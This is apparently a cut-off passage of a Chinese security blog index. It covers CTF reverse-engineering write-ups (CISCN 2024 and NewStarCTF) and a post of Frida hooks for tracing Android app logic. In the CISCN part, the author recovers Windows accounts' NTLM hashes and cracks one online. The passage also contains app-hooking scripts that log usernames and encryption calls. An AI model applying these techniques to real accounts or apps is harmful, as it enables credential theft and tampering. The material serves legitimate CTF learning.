66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 void __fastcall sub_140082974(__int64 a1, _QWORD *a2) { __int64 v2; // rdi _QWORD *v3; // r13 unsigned __int16 v5; // ax int v6; // ebx __int64 v7; // rdx int v8; // ecx _WORD *v9; // r12 _WORD *v10; // rax _WORD *v11; // r14 _WORD *v12; // rbp __int64 v13; // r15 __int64 v14; // r13 int v15; // ebp __int64 v16; // r9 int v17; // r8d unsigned __int64 v18; // rdx _WORD *v19; // r10 unsigned __int64 v20; // r11 __int64 v21; // rbx __int64 v22; // rdx unsigned __int64 v23; // rcx __int16 v24; // dx __int16 v25; // ax _BYTE *v26; // rax _BYTE *v27; // rbx __int16 *v28; // rdx signed __int64 v29; // rax __int16 v30; // cx _WORD *v31; // rcx __int64 v32; // rdx __int16 v33; // ax _BYTE *v34; // rcx v2 = -1i64; v3 = a2; do ++v2; while ( *(_WORD *)(a1 + 2 * v2) ); v5 = 70; v6 = 0; v7 = 0i64; v8 = 1; do { v6 = (v6 + v8 * v5) % 256; v5 = byte_140111152[v7++]; ++v8; } while ( v5 ); srand(v6); v9 = j__malloc_base(2i64 * (int)v2 + 2); v10 = j__malloc_base(2i64 * (4 * (int)v2 / 3) + 72); v11 = v10; if ( !v9 || !v10 ) goto LABEL_36; if ( (int)v2 \u0026gt; 0 ) { v12 = v9; v13 = a1 - (_QWORD)v9; v14 = (int)v2; do { *v12 = rand() % 128 + (v6 ^ *(_WORD *)((char *)v12 + v13)); ++v12; --v14; } while ( v14 ); v3 = a2; } v9[(int)v2] = 0; v15 = 0; if ( (int)v2 \u0026gt; 0 ) { v16 = 0i64; v17 = 2; v18 = ((int)v2 - 1i64) / 3ui64; v19 = v9 + 2; v20 = v18 + 1; v15 = 4 * (v18 + 1); do { if ( v17 - 1 \u0026gt;= (int)v2 ) v21 = 0i64; else v21 = (unsigned __int8)*(v19 - 1); if ( v17 \u0026gt;= (int)v2 ) v22 = 0i64; else v22 = (unsigned __int8)*v19; v23 = v22 | ((v21 | ((unsigned __int64)(unsigned __int8)*(v19 - 2) \u0026lt;\u0026lt; 8)) \u0026lt;\u0026lt; 8); v11[v16] = word_140111070[v23 \u0026gt;\u0026gt; 18]; v11[v16 + 1] = word_140111070[(v23 \u0026gt;\u0026gt; 12) \u0026amp; 0x3F]; if ( v17 - 1 \u0026gt;= (int)v2 ) v24 = 61; else v24 = word_140111070[(v23 \u0026gt;\u0026gt; 6) \u0026amp; 0x3F]; v11[v16 + 2] = v24; if ( v17 \u0026gt;= (int)v2 ) v25 = 61; else v25 = word_140111070[v23 \u0026amp; 0x3F]; v11[v16 + 3] = v25; v17 += 3; v16 += 4i64; v19 += 3; --v20; } while ( v20 ); } v11[v15] = 0; v26 = j__malloc_base(2i64 * v15 + 66); v27 = v26; if ( !v26 ) { LABEL_36: printf(L\u0026#34;Memory allocation failed\\n\u0026#34;); exit(1); } v28 = (__int16 *)\u0026amp;unk_140111100; v29 = v26 - (_BYTE *)\u0026amp;unk_140111100; do { v30 = *v28; *(__int16 *)((char *)v28 + v29) = *v28; ++v28; } while ( v30 ); v31 = v27 - 2; do ++v31; while ( *v31 ); v32 = 0i64; do { v33 = v11[v32]; v31[v32++] = v33; } while ( v33 ); v34 = v27 - 2; do v34 += 2; while ( *(_WORD *)v34 ); *(_OWORD *)v34 = xmmword_140111128; *((_OWORD *)v34 + 1) = xmmword_140111138; *((_WORD *)v34 + 16) = 0; j__free_base(v9); j__free_base(v11); *v3 = v27; } 在数据段word_140111070发现疑似Base64表\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 .rdata:0000000140111070 word_140111070 dw 64h ; DATA XREF: sub_140082974+18F↑r .rdata:0000000140111070 ; sub_140082974+1A6↑r ... .rdata:0000000140111072 db 2Bh ; + .rdata:0000000140111073 db 0 .rdata:0000000140111074 db 46h ; F .rdata:0000000140111075 db 0 .rdata:0000000140111076 db 33h ; 3 .rdata:0000000140111077 db 0 .rdata:0000000140111078 db 44h ; D .rdata:0000000140111079 db 0 .rdata:000000014011107A db 77h ; w .rdata:000000014011107B db 0 .rdata:000000014011107C db 57h ; W .rdata:000000014011107D db 0 .rdata:000000014011107E db 6Ah ; j .rdata:000000014011107F db 0 .rdata:0000000140111080 db 38h ; 8 .rdata:0000000140111081 db 0 .rdata:0000000140111082 db 74h ; t .rdata:0000000140111083 db 0 .rdata:0000000140111084 db 55h ; U .rdata:0000000140111085 db 0 .rdata:0000000140111086 db 63h ; c .rdata:0000000140111087 db 0 .rdata:0000000140111088 db 6Bh ; k .rdata:0000000140111089 db 0 .rdata:000000014011108A db 56h ; V .rdata:000000014011108B db 0 .rdata:000000014011108C db 47h ; G .rdata:000000014011108D db 0 .rdata:000000014011108E db 5Ah ; Z .rdata:000000014011108F db 0 .rdata:0000000140111090 db 62h ; b .rdata:0000000140111091 db 0 .rdata:0000000140111092 db 35h ; 5 .rdata:0000000140111093 db 0 .rdata:0000000140111094 db 37h ; 7 .rdata:0000000140111095 db 0 .rdata:0000000140111096 db 53h ; S .rdata:0000000140111097 db 0 .rdata:0000000140111098 db 31h ; 1 .rdata:0000000140111099 db 0 .rdata:000000014011109A db 58h ; X .rdata:000000014011109B db 0 .rdata:000000014011109C db 73h ; s .rdata:000000014011109D db 0 .rdata:000000014011109E db 4Ch ; L .rdata:000000014011109F db 0 .rdata:00000001401110A0 db 71h ; q .rdata:00000001401110A1 db 0 .rdata:00000001401110A2 db 66h ; f .rdata:00000001401110A3 db 0 .rdata:00000001401110A4 db 6Dh ; m .rdata:00000001401110A5 db 0 .rdata:00000001401110A6 db 30h ; 0 .rdata:00000001401110A7 db 0 .rdata:00000001401110A8 db 76h ; v .rdata:00000001401110A9 db 0 .rdata:00000001401110AA db 6Eh ; n .rdata:00000001401110AB db 0 .rdata:00000001401110AC db 70h ; p .rdata:00000001401110AD db 0 .rdata:00000001401110AE db 65h ; e .rdata:00000001401110AF db 0 .rdata:00000001401110B0 db 4Dh ; M .rdata:00000001401110B1 db 0 .rdata:00000001401110B2 db 45h ; E .rdata:00000001401110B3 db 0 .rdata:00000001401110B4 db 7Ah ; z .rdata:00000001401110B5 db 0 .rdata:00000001401110B6 db 51h ; Q .rdata:00000001401110B7 db 0 .rdata:00000001401110B8 db 32h ; 2 .rdata:00000001401110B9 db 0 .rdata:00000001401110BA db 42h ; B .rdata:00000001401110BB db 0 .rdata:00000001401110BC db 67h ; g .rdata:00000001401110BD db 0 .rdata:00000001401110BE db 2Fh ; / .rdata:00000001401110BF db 0 .rdata:00000001401110C0 db 50h ; P .rdata:00000001401110C1 db 0 .rdata:00000001401110C2 db 54h ; T .rdata:00000001401110C3 db 0 .rdata:00000001401110C4 db 72h ; r .rdata:00000001401110C5 db 0 .rdata:00000001401110C6 db 6Fh ; o .rdata:00000001401110C7 db 0 .rdata:00000001401110C8 db 68h ; h .rdata:00000001401110C9 db 0 .rdata:00000001401110CA db 78h ; x .rdata:00000001401110CB db 0 .rdata:00000001401110CC db 6Ch ; l .rdata:00000001401110CD db 0 .rdata:00000001401110CE db 75h ; u .rdata:00000001401110CF db 0 .rdata:00000001401110D0 db 69h ; i .rdata:00000001401110D1 db 0 .rdata:00000001401110D2 db 4Ah ; J .rdata:00000001401110D3 db 0 .rdata:00000001401110D4 db 43h ; C .rdata:00000001401110D5 db 0 .rdata:00000001401110D6 db 52h ; R .rdata:00000001401110D7 db 0 .rdata:00000001401110D8 db 49h ; I .rdata:00000001401110D9 db 0 .rdata:00000001401110DA db 59h ; Y .rdata:00000001401110DB db 0 .rdata:00000001401110DC db 41h ; A .rdata:00000001401110DD db 0 .rdata:00000001401110DE db 79h ; y .rdata:00000001401110DF db 0 .rdata:00000001401110E0 db 48h ; H .rdata:00000001401110E1 db 0 .rdata:00000001401110E2 db 36h ; 6 .rdata:00000001401110E3 db 0 .rdata:00000001401110E4 db 4Eh ; N .rdata:00000001401110E5 db 0 .rdata:00000001401110E6 db 34h ; 4 .rdata:00000001401110E7 db 0 .rdata:00000001401110E8 db 61h ; a .rdata:00000001401110E9 db 0 .rdata:00000001401110EA db 4Bh ; K .rdata:00000001401110EB db 0 .rdata:00000001401110EC db 4Fh ; O .rdata:00000001401110ED db 0 .rdata:00000001401110EE db 39h ; 9 .rdata:00000001401110EF db 0 .rdata:00000001401110F0 db 0 .rdata:00000001401110F1 db 0 .rdata:00000001401110F2 db 0 .rdata:00000001401110F3 db 0 .rdata:00000001401110F4 db 0 .rdata:00000001401110F5 db 0 .rdata:00000001401110F6 db 0 .rdata:00000001401110F7 db 0 .rdata:00000001401110F8 db 0 .rdata:00000001401110F9 db 0 .rdata:00000001401110FA db 0 .rdata:00000001401110FB db 0 .rdata:00000001401110FC db 0 .rdata:00000001401110FD db 0 .rdata:00000001401110FE db 0 .rdata:00000001401110FF db 0 弄出来为d+F3DwWj8tUckVGZb57S1XsLqfm0vnpeMEzQ2Bg/PTrohxluiJCRIYAyH6N4aKO9\n在data段把上面加密过程用到的数组弄出来，data段内容如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 .rdata:0000000140111152 byte_140111152 db 69h ; DATA XREF: sub_140082974:loc_1400829D9↑r .rdata:0000000140111153 db 0 .rdata:0000000140111154 db 78h ; x .rdata:0000000140111155 db 0 .rdata:0000000140111156 db 65h ; e .rdata:0000000140111157 db 0 .rdata:0000000140111158 db 64h ; d .rdata:0000000140111159 db 0 .rdata:000000014011115A db 53h ; S .rdata:000000014011115B db 0 .rdata:000000014011115C db 65h ; e .rdata:000000014011115D db 0 .rdata:000000014011115E db 65h ; e .rdata:000000014011115F db 0 .rdata:0000000140111160 db 64h ; d .rdata:0000000140111161 db 0 .rdata:0000000140111162 db 0 .rdata:0000000140111163 db 0 .rdata:0000000140111164 align 8 通过上面已有的信息先尝试计算v6，写个C的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; int main() { char word_140111152[] = { \u0026#39;i\u0026#39;, 0, \u0026#39;x\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;d\u0026#39;, 0, \u0026#39;S\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;d\u0026#39;, 0, 0, 0}; unsigned short *pass_list = (unsigned short *)word_140111152; int v5, v6, v7, v8; v5 = 70; v8 = 1; v7 = 0; v6 = 0; do { printf(\u0026#34;[DEBUG] Before calculate v6 = %d\\n\u0026#34;, v6); v6 = (int)(v6 + v8 * v5) % 256; v5 = pass_list[v7++]; ++v8; printf(\u0026#34;[DEBUG] After calculate v6 = %d\\n\u0026#34;, v6); } while (v5); printf(\u0026#34;v6 = %d\u0026#34;, v6); } 得到v6为105\n预先在赛博厨子完成Base64的解密，得到数据流\n1 b9 48 1c 58 81 4f 51 7d 27 70 33 6f 79 48 82 21 08 80 79 49 51 52 28 9b 7d bb 40 67 45 7a 96 38 3e 7d 41 42 86 60 4f 6c 3b 87 2e 26 72 51 83 80 79 bd 79 40 67 71 4a a2 98 76 3a 8f 68 da 7f 74 2a 33 55 8d 5e 2b 39 6d be 5f 74 74 7d 11 8e 4b 4d 99 64 79 63 b3 73 ca 31 90 c3 77 1b 6f 61 52 11 bc bd 86 b2 78 4f 7e 56 8f 6c 94 b4 3a 7f 14 4b 79 b6 8c b0 ad 8b 67 6d d1 7a 9a a7 31 74 25 3e 61 2e 82 3d 63 5e 77 6b 7c 3f 24 65 35 9f 53 84 92 42 a0 7d 66 70 3b d3 65 a2 6d 7f 19 92 7a 8c b8 6b 12 18 66 74 c0 48 64 9d 0e 6f 53 96 49 61 5d 放入C代码，完成下面的部分，进行解密\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { char word_140111152[] = { \u0026#39;i\u0026#39;, 0, \u0026#39;x\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;d\u0026#39;, 0, \u0026#39;S\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;e\u0026#39;, 0, \u0026#39;d\u0026#39;, 0, 0, 0}; unsigned short *pass_list = (unsigned short *)word_140111152; int v5, v6, v7, v8; v5 = 70; v8 = 1; v7 = 0; v6 = 0; do { printf(\u0026#34;[DEBUG] Before calculate v6 = %d\\n\u0026#34;, v6); v6 = (int)(v6 + v8 * v5) % 256; v5 = pass_list[v7++]; ++v8; printf(\u0026#34;[DEBUG] After calculate v6 = %d\\n\u0026#34;, v6); } while (v5); printf(\u0026#34;v6 = %d\\n\u0026#34;, v6); srand(v6); // 设置种子 int data[] = {0xb9, 0x48, 0x1c, 0x58, 0x81, 0x4f, 0x51, 0x7d, 0x27, 0x70, 0x33, 0x6f, 0x79, 0x48, 0x82, 0x21, 0x08, 0x80, 0x79, 0x49, 0x51, 0x52, 0x28, 0x9b, 0x7d, 0xbb, 0x40, 0x67, 0x45, 0x7a, 0x96, 0x38, 0x3e, 0x7d, 0x41, 0x42, 0x86, 0x60, 0x4f, 0x6c, 0x3b, 0x87, 0x2e, 0x26, 0x72, 0x51, 0x83, 0x80, 0x79, 0xbd, 0x79, 0x40, 0x67, 0x71, 0x4a, 0xa2, 0x98, 0x76, 0x3a, 0x8f, 0x68, 0xda, 0x7f, 0x74, 0x2a, 0x33, 0x55, 0x8d, 0x5e, 0x2b, 0x39, 0x6d, 0xbe, 0x5f, 0x74, 0x74, 0x7d, 0x11, 0x8e, 0x4b, 0x4d, 0x99, 0x64, 0x79, 0x63, 0xb3, 0x73, 0xca, 0x31, 0x90, 0xc3, 0x77, 0x1b, 0x6f, 0x61, 0x52, 0x11, 0xbc, 0xbd, 0x86, 0xb2, 0x78, 0x4f, 0x7e, 0x56, 0x8f, 0x6c, 0x94, 0xb4, 0x3a, 0x7f, 0x14, 0x4b, 0x79, 0xb6, 0x8c, 0xb0, 0xad, 0x8b, 0x67, 0x6d, 0xd1, 0x7a, 0x9a, 0xa7, 0x31, 0x74, 0x25, 0x3e, 0x61, 0x2e, 0x82, 0x3d, 0x63, 0x5e, 0x77, 0x6b, 0x7c, 0x3f, 0x24, 0x65, 0x35, 0x9f, 0x53, 0x84, 0x92, 0x42, 0xa0, 0x7d, 0x66, 0x70, 0x3b, 0xd3, 0x65, 0xa2, 0x6d, 0x7f, 0x19, 0x92, 0x7a, 0x8c, 0xb8, 0x6b, 0x12, 0x18, 0x66, 0x74, 0xc0, 0x48, 0x64, 0x9d, 0x0e, 0x6f, 0x53, 0x96, 0x49, 0x61, 0x5d}; int new_data[sizeof(data) / sizeof(data[0])] = {0}; printf(\u0026#34;Using v6 = %d to generate random number\u0026#34;, v6); for (int i = 0; i \u0026lt; sizeof(data) / sizeof(data[0]); i++) { int random_number = rand(); new_data[i] = (int)(data[i] - random_number % 128) ^ v6; } for (int i = 0; i \u0026lt; sizeof(data) / sizeof(data[0]); i++) { printf(\u0026#34;%c\u0026#34;, new_data[i]); } } 得到输出为\n1 2 3 4 5 6 7 8 9 10 User=Administrator NTLM= User=DefaultAccount NTLM= User=Guest NTLM= User=Lihua NTLM=23d1e086b85cc18587bbc8c33adefe07 User=WDAGUtilityAccount NTLM=d3280b38985c05214dcc81b74dd98b4f 取得账户Lihua的NTLM加密哈希为23d1e086b85cc18587bbc8c33adefe07，找一个网站去解密\nMD5 在線免費解密 MD5、SHA1、MySQL、NTLM、SHA256、SHA512、Wordpress、Bcrypt 的雜湊\n得到最后的结果为memeallme!，所以flag为flag{memeallme!}\n","date":"2024-12-15T19:49:19+08:00","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501032016159.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/2024ciscn-writeup%E6%9C%80%E5%A5%BD%E3%81%AE%E4%B8%80%E5%8F%89%E6%A0%91%E4%BD%BF%E7%94%A8%E8%80%85/","title":"2024CISCN Writeup(最好の一叉树使用者)"},{"content":"Frida Hook实现APP关键代码快速定位(Java层) HashMap的put方法 1 2 3 4 5 6 7 8 var hashMap = Java.use(\u0026#34;java.util.HashMap\u0026#34;); //获取HashMap类 hashMap.put.implementation = function(a,b){ //hook HashMap的put方法 if(a.equals(\u0026#34;username\u0026#34;)){ showStacks(); //打印函数调用栈信息 console.log(\u0026#34;hashMap.put: \u0026#34;, a, b); } return this.put(a,b); //执行原函数 } 打印函数调用关系栈 1 2 3 4 5 6 7 function showStacks(){ console.log( Java.use(\u0026#34;android.util.Log\u0026#34;).getStackTraceString( //调用Android系统提供的类的方法 Java.use(\u0026#34;java.lang.Throwable\u0026#34;).$new() //创建对象 ) ); } ArrayList的add、addAll、set方法等 1 2 3 4 5 6 7 8 9 var arrayList = Java.use(\u0026#34;java.util.ArrayList\u0026#34;); arrayList.add.overload(\u0026#39;java.lang.Object\u0026#39;).implementation = function(a){ //方法如有重载需指定为具体的重载方法 if(a.equals(\u0026#34;username = 19002040031\u0026#34;)){ showStacks(); console.log(\u0026#34;arrayList.add: \u0026#34;,a); } //console.log(\u0026#34;arrayList.add: \u0026#34;,a); return this.add(a); } TextUtils的isEmpty方法 1 2 3 4 5 6 7 8 9 var textUtils = Java.use(\u0026#34;android.text.TextUtils\u0026#34;); textUtils.isEmpty.implementation = function (a) { if(a == \u0026#34;2v+DC2gq7RuAC8PE5GZz5wH3/y9ZVcWhFwhDY9L19g9iEd075+Q7xwewvfIN0g0ec/NaaF43/S0=\u0026#34;){ showStacks(); console.log(\u0026#34;textUtils.isEmpty: \u0026#34;, a); } //console.log(\u0026#34;textUtils.isEmpty: \u0026#34;, a); return this.isEmpty(a); } Log 1 2 3 4 5 6 var log = Java.use(\u0026#34;android.util.Log\u0026#34;); log.w.overload(\u0026#39;java.lang.String\u0026#39;, \u0026#39;java.lang.String\u0026#39;).implementation = function (tag, message) { showStacks(); console.log(\u0026#34;log.w: \u0026#34;, tag, message); return this.w(tag, message); } Collections的sort方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var collections = Java.use(\u0026#34;java.util.Collections\u0026#34;); //上层函数 collections.sort.overload(\u0026#39;java.util.List\u0026#39;).implementation = function (a) { showStacks(); var result = Java.cast(a, Java.use(\u0026#34;java.util.ArrayList\u0026#34;)); console.log(\u0026#34;collections.sort List: \u0026#34;, result.toString()); return this.sort(a); } //偏底层的sort collections.sort.overload(\u0026#39;java.util.List\u0026#39;, \u0026#39;java.util.Comparator\u0026#39;).implementation = function (a, b) { showStacks(); var result = Java.cast(a, Java.use(\u0026#34;java.util.ArrayList\u0026#34;)); console.log(\u0026#34;collections.sort List Comparator: \u0026#34;, result.toString()); return this.sort(a, b); } ///java.util.Arrays sort toString JSONObject的put、getString方法等(现在更多用GSON) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var jSONObject = Java.use(\u0026#34;org.json.JSONObject\u0026#34;); //put方法 jSONObject.put.overload(\u0026#39;java.lang.String\u0026#39;, \u0026#39;java.lang.Object\u0026#39;).implementation = function (a, b) { showStacks(); //var result = Java.cast(a, Java.use(\u0026#34;java.util.ArrayList\u0026#34;)); console.log(\u0026#34;jSONObject.put: \u0026#34;, a, b); return this.put(a, b); } //getString方法 jSONObject.getString.implementation = function (a) { //showStacks(); //var result = Java.cast(a, Java.use(\u0026#34;java.util.ArrayList\u0026#34;)); console.log(\u0026#34;jSONObject.getString: \u0026#34;, a); var result = this.getString(a); console.log(\u0026#34;jSONObject.getString result: \u0026#34;, result); return result; } Toast的show方法 1 2 3 4 5 6 var toast = Java.use(\u0026#34;android.widget.Toast\u0026#34;); toast.show.implementation = function(){ showStacks(): console.log(\u0026#34;toast.show: \u0026#34;); return this.show(); } Base64 1 2 3 4 5 6 7 8 9 10 11 12 13 var base64 = Java.use(\u0026#34;android.util.Base64\u0026#34;); base64.encodeToString.overload(\u0026#39;[B\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (a, b) { //[B为字节数组类型 showStacks(); console.log(\u0026#34;base64.encodeToString: \u0026#34;, JSON.stringify(a)); //把JSON对象解析成文本(Str等) var result = this.encodeToString(a, b); console.log(\u0026#34;base64.encodeToString result: \u0026#34;, result) return result; } //java.net.URLEncoder //java.util.Base64 //okio.Base64 //okio.ByteString String的getBytes,isEmpty方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var str = Java.use(\u0026#34;java.lang.String\u0026#34;); str.getBytes.overload().implementation = function(){ var result = this.getBytes(); var newStr = str.$new(result); console.log(\u0026#34;sre.getBytes result: \u0026#34;,newStr); return result; } str.getBytes.overload(\u0026#39;java.lang.String\u0026#39;).implementation = function (a) { showStacks(); var result = this.getBytes(a); var newStr = str.$new(result, a); console.log(\u0026#34;str.getBytes result: \u0026#34;, newStr); return result; } String构造函数的Hook 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 var stringFactory = Java.use(\u0026#34;java.lang.StringFactory\u0026#34;); //注意要HookStringFactory类而不是String类 stringFactory.newStringFromString.implementation = function (a) { showStacks(); var retval = this.newStringFromString(a); console.log(\u0026#34;stringFactory.newStringFromString: \u0026#34;, retval); return retval; } stringFactory.newStringFromChars.overload(\u0026#39;[C\u0026#39;).implementation = function (a) { showStacks(); var retval = this.newStringFromChars(a); console.log(\u0026#34;stringFactory.newStringFromChars: \u0026#34;, retval); return retval; } //newStringFromBytes、newStringFromChars //newStringFromString、newStringFromStringBuffer、newStringFromStringBuilder StringBuilder、StringBuffer的Hook 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var sb = Java.use(\u0026#34;java.lang.StringBuilder\u0026#34;); sb.toString.implementation = function(){ var retval = this.toString(); if(retval.indexOf(\u0026#34;Encrypt\u0026#34;) != -1){ showStacks(); } console.log(\u0026#34;StringBuilder.toString: \u0026#34;, retval); return retval; } var sb = Java.use(\u0026#34;java.lang.StringBuffer\u0026#34;); sb.toString.implementation = function () { var retval = this.toString(); if (retval.indexOf(\u0026#34;username\u0026#34;) != -1) { showStacks(); } console.log(\u0026#34;StringBuffer.toString: \u0026#34;, retval); return retval; } findViewById找控件id(打印R$id的属性)(不建议优先使用) ==Java.enumerateLoadedClassesSync==枚举所有已加载的类\n如果不知道类路径，可以用这个方法，然后过滤一下类名\n==frida -U -f com.dodonew.online -l HookDemo.js -o log.txt \u0026ndash;no-pause==\n​\t==-f==代码让frida帮我们重新启动app，一开始就注入js\n​\t==\u0026ndash;no-pause== 直接运行主线程，中途不暂停\n==R$id== 内部类的访问\n==R$id.btn_login.value== 类的属性\n1 2 3 4 5 6 7 8 9 10 var btn_login_id = Java.use(\u0026#34;com.dodonew.online.R$id\u0026#34;).btn_login.value; //id为R的内部类，写法略有不同 console.log(\u0026#34;btn_login_id\u0026#34;, btn_login_id); var appCompatActivity = Java.use(\u0026#34;android.support.v7.app.AppCompatActivity\u0026#34;); appCompatActivity.findViewById.implementation = function (a) { if(a == btn_login_id){ showStacks(); console.log(\u0026#34;appCompatActivity.findViewById: \u0026#34;, a); } return this.findViewById(a); } setOnClickListener ==hook这个函数，比对控件id，打印函数栈==\n1 2 3 4 5 6 7 8 9 10 11 12 var btn_login_id = Java.use(\u0026#34;com.dodonew.online.R$id\u0026#34;).btn_login.value; console.log(\u0026#34;btn_login_id\u0026#34;, btn_login_id); var view = Java.use(\u0026#34;android.view.View\u0026#34;); view.setOnClickListener.implementation = function (a) { if(this.getId() == btn_login_id){ showStacks(); console.log(\u0026#34;view.id: \u0026#34; + this.getId()); console.log(\u0026#34;view.setOnClickListener is called\u0026#34;); } return this.setOnClickListener(a); } 快速定位协议头加密okhttp3的addHeader方法 1 2 3 4 5 6 7 8 9 var okhttp_Builder = Java.use(\u0026#39;okhttp3.Request$Builder\u0026#39;); okhttp_Builder.addHeader.implementation = function (a, b) { showStacks(); return this.addHeader(a, b); } Other ==加密库==相关的hook(自吐算法)\n==SSL==相关的hook\n==socket==相关的hook\n==SocketOutputStream==\n==SocketInputStream==\n读写文件相关的 ==java.io.File==\n证书双向验证 ==Keystore.load== 通常有证书和密码\n安卓退出进程的方式\n","date":"2024-11-28T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501020013066.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/frida-hook%E5%AE%9E%E7%8E%B0app%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8Djava%E5%B1%82/","title":"Frida Hook实现APP关键代码快速定位(Java层)"},{"content":"NewStarCTF Re Week 1 Base64 先放IDA中打开\n可以看到先让我们输入了flag，很显然str就是我们的输入，长度为112.下面进行了判断，跟一串奇怪的字符串进行了判断，这串字符串就是加密过后的密文。\n下一步的思路就是去看看是哪个函数对str进行操作，分析后发现是sub_1400014E0函数对str操作，sub_1400014E0的内容如图\n在里面可以看到str以aWhyDo3sthis7ab字符表为基础进行映射得到了密文,跟进可以得到字符表的具体内容WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/\n顺便把密文也贴出来g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=\n下面给出exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import base64 # 给定的密文和映射表 cipher_text = \u0026#34;g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc=\u0026#34; custom_table = \u0026#34;WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ/\u0026#34; # 将映射表转化为标准Base64字符表顺序 standard_table = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34; # 创建解码表：将映射表字符转换到标准Base64字符 decode_table = str.maketrans(custom_table, standard_table) # 使用映射表对密文进行字符替换 translated_cipher = cipher_text.translate(decode_table) # 解码Base64 decoded_data = base64.b64decode(translated_cipher) print(\u0026#34;解码后的数据:\u0026#34;, decoded_data) 得到flag：flag{y0u_kn0w_base64_well}\nSimple_encryption 通过DIE查壳知道无壳，64位架构，f5进入main函数\n首先是scanf输入一段字符串到input（其实就是你得到的flag），接着for循环对我们的输入进行了三个操作，很明显看到是对input的第j个元素进行操作，当j%3 = 0,1,2的时候，进行不同的操作，循环结束将input数组与buffer数组进行比较，即密文。提取出密文之后即可解密，exp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #include\u0026lt;stdio.h\u0026gt; int main() { char buffer[] = { 71,149,52,72,164,28,53,136,100,22,136,7,20,106,57,18,162,10,55,92,7,90,86,96,18,118,37,18,142,40,2 }; for (int i = 0; i \u0026lt; 30; i++ ) { if (!(i % 3)) buffer[i] += 31; if (i % 3 == 1) buffer[i] -= 41; if (i % 3 == 2) buffer[i] ^= 0x55; } printf(\u0026#34;%s\u0026#34;, buffer); return 0; } flag{IT_15_R3Al1y_V3Ry-51Mp1e}\nez_debug 如题，显然是告诉我们要通过动调得到flag，先分析反编译的代码\n反编译之后能看到这是c++代码编写的文件，读起来非常吃力，但是在最后会对用户输入进行一个比较，考虑在比较的if语句位置设下断点看能不能直接查看到flag，用xdbg打开\n可以看到在right语句执行前先对al进行了判断（je），值为真则跳转到wrong语句。关键点在于right语句后面有个jmp操作（无条件跳转），意思就是只要我们输入了正确的flag，就一定会跳转到某个语句，而输入错误则不会跳转，接着往跳转的位置往下看，发现了一串字符串“decrypted flag：”，显然这个right跳转的语句会执行一系列操作将解密过后的flag打印出来，到这里我们的思路就很清晰了，只需要nop掉判断我们输入的语句，让程序一定会执行到right语句，接着跳转到解密函数的位置让程序来帮我们解密即可。\n如图，nop掉判断操作，并在Decrypted flag的位置打断点（解密结束才会运行到断点处），剩下的只需要运行程序知道命中我们的断点即可。\n可以看到，命中断点之后，解密之后的flag也显现出来了flag{y0u_ar3_g0od_@_Debu9}\nWeek 2 UPX DIE查壳，发现是upx壳\n用upx脱壳就行了，命令：upx -d yourflie.exe\n脱壳后IDA反编译即可\nf5之后可以看到进行了RC4加密，data是密文，RC4是个对称加密算法，其加解密过程是一样的，exp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void swap(char* a1,char* a2) { char temp; temp = *a1; *a1 = *a2; *a2 = temp; } void RC4_Decode(char* data, unsigned char* sbox) { unsigned char a = 0; unsigned char b = 0; int length = 22; for (int i = 0; i \u0026lt; length; i++) { b += sbox[++a]; swap((char*)\u0026amp;sbox[a], (char*)\u0026amp;sbox[b]); 